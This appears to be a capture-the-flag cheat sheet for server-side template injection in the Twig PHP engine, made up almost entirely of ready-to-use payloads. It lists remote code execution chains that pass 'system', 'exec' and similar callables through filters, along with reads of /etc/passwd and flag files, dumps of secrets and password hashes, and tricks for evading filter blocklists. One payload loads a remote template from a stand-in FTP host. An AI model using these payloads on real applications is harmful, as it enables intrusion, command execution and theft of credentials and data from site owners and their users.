# Twig — PHP template engine (Symfony)

Marker: `{{7*7}}` → 49; `{{7*'7'}}` → `49` (numeric coercion —
THIS distinguishes Twig from Jinja2's `7777777`).

Twig is PHP — the escape reaches PHP functions via `self`,
`_context`, `app.user`, or the `sort`/`map`/`filter` filter RCEs.

---

## 1. The confirm + identify

```twig
{{7*7}}         → 49       -- Twig, Jinja2, or Nunjucks
{{7*'7'}}        → 49       -- Twig (Jinja2 gives 7777777)
{{['a']|first}}  → a
{{dump()}}       → dumps context — needs debug mode
{{app}}          → Symfony app object — kernel, environment, request
{{_self}}        → the template itself — gateway to the env
{{_context}}     → all template variables as array
```

`{{_context}}` is the grab-all — dumps every variable in scope
(often includes the flag or secrets directly).

---

## 2. The classic escapes — Twig 1.x/2.x

### `self.env` → call_user_func RCE

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
   → id output — the canonical Twig 1.x RCE

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag")}}

{{_self.env.setCache("ftp://me.com")}}{{_self.env.loadTemplate("backdoor")}}
   -- remote template load — rarely reachable

{{_self.env.enableDebug()}}  -- enables debug → dump() leaks context
```

`registerUndefinedFilterCallback` — registers ANY php callable as
a filter → `getFilter("cmd")` invokes it with the string. The
`.env` accessor path changed across versions:

```twig
{{_self.env...}}                 -- Twig 1.x
{{_self.template.context...}}    -- some 2.x
{{app.request...}}               -- Symfony app context — different
```

### The `sort`/`map`/`filter` callables — modern RCE

```twig
{{['id']|sort('system')}}
   -- sort takes a comparison callable — 'system' gets called
   -- the two args it receives = array elements — usually error,
      but callable-injection is the primitive

{{['id']|map('system')}}
{{['id']|filter('system')}}
{{['id','']|reduce('system')}}
{{['id']|u.truncate('md5')}}
```

`sort`/`map`/`filter`/`reduce` accept a callable — injecting
`'system'`, `'passthru'`, `'shell_exec'`, `'exec'` reaches RCE.
The arg the callable receives is the array element — your `'id'`
string IS the command.

---

## 3. The `app`/`request`/`kernel` paths — Symfony context

```twig
{{app.request.server.get('DOCUMENT_ROOT')}}
{{app.request}}
{{app.request.query.all}}                  -- GET params
{{app.request.cookies}}
{{app.environment}}                        -- dev/prod
{{app.kernel.projectDir}}
{{app.user}}                               -- the user object (often
                                             full entity — leaks!)
{{app.user.email}} {{app.user.password}}   -- entity fields
```

`{{app.user}}` often dumps the entity including password hash —
CTF flags sometimes hide in user records.

---

## 4. Symfony sandbox mode — `sandbox` extension

When Twig's sandbox extension is on, only whitelisted tags/filters/
functions/methods run:

```twig
{% sandbox %}{% include 'x.twig' %}{% endsandbox %}
```

Bypasses: older sandbox checked only TAGS not the attribute access —
`{{x.y}}` method calls walked through. Modern Twig security-policy
blocks more; the remaining bypass is usually a whitelisted method
that reaches a dangerous path (e.g., `getAttribute` chains).

---

## 5. Template-name injection — `include`/`extends` abuse

```twig
{% include 'admin.html.twig' %}      -- include internal templates
{% extends 'base.html.twig' %}       -- extends context
{{ include('/etc/passwd') }}          -- include as function —
                                      path traversal → file read
{{ include('../../../etc/passwd') }}  -- traversal
{{ source('/etc/passwd') }}           -- source() reads template file
{{ source('../../../../flag') }}
```

`source()` reads a template FILE's source — the file-read path.
`include()` executes it.

---

## 6. The `dump`/`constant`/`attribute` helpers

```twig
{{dump(app)}}                       -- var_dump the app
{{constant('FLAG_CONST')}}           -- reads PHP constants —
                                      flag often a define()
{{constant('APP_SECRET')}}
{{constant('Twig\\Environment::MAJOR_VERSION')}}  -- version leak
{{attribute(obj,'prop')}}            -- dynamic attr — reaches getters
{{attribute(app.request,'server')}}  -- indirect access
{{range(1,10)}}                      -- function probe
{{cycle([1,2],0)}}                   -- function probe
```

`constant()` reads ANY PHP constant — `FLAG`, `APP_SECRET`, env-
injected constants are the usual CTF catch.

---

## 7. Twig → PHP code-exec summary — the working chains

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|map('system')|join}}
{{['id']|filter('system')|join}}
{{['id']|sort('system')}}
{{['id']|reduce('system')}}
{{['id']|u.map('system')}}                  -- unicode ext
{{['cat /flag']|map('system')|join}}
{{['cat /flag']|map('passthru')|join}}
{{['cat /flag']|map('shell_exec')|join}}
{{['cat /flag']|map('exec')|join}}
{{['id']|map('proc_open')}}                 -- signature mismatch risk
```

The array-element = arg trick: `|map('system')` calls
`system('id')` for each element. `|join` flattens the result.

---

## 8. Filter-name evasion — when `system` is blocked

```twig
{{['id']|map('sys'~'tem')}}          -- concat the name
{{['id']|map(app.request.query.get('f'))}}&f=system
   -- callable name via request param
```

---

## 9. Numbered quick-reference — the exploitation sequence

```twig
{{7*7}}                          -- confirm eval
{{7*'7'}}                         -- confirm Twig (49 not 7777777)
{{_context}}                       -- dump all vars — flag may be here
{{dump()}}                          -- var_dump everything
{{app.user}}                        -- entity data
{{app.request}}                     -- request env
{{constant('FLAG')}}                 -- constants
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['cat /flag']|map('system')|join}}  -- modern RCE
{{source('/flag')}}                   -- file read via source()
```
